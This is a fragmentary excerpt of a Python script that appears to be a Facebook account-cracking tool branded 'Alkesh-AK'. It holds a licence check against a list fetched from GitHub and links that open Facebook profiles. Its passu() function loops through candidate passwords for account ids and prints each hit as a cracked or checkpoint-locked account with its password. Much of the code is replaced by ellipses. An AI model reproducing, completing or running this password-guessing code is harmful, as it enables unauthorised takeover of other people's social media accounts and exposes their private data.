...
def contact():
	os.system('xdg-open https://www.facebook.com/LIINK.COPY.GARIIS.RANDII.KE.BAXHE')
	back()
def animation(u):
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/alkeshhero/Phoenix/main/Phoenix.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/profile.php?id=100082538501118')
      time.sleep(1)
      exit()
  except: 
...
def passu():
	...
	linex()
	prog = Progress(TextColumn('\033[1;97m [Alkesh-AK]{task.description}'))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [Alkesh-CP] {idf}  {pw}\033[1;97m')
				...
				print(f'\033[1;32m [Alkesh-OK] {idf}  {pw}\033[1;97m')
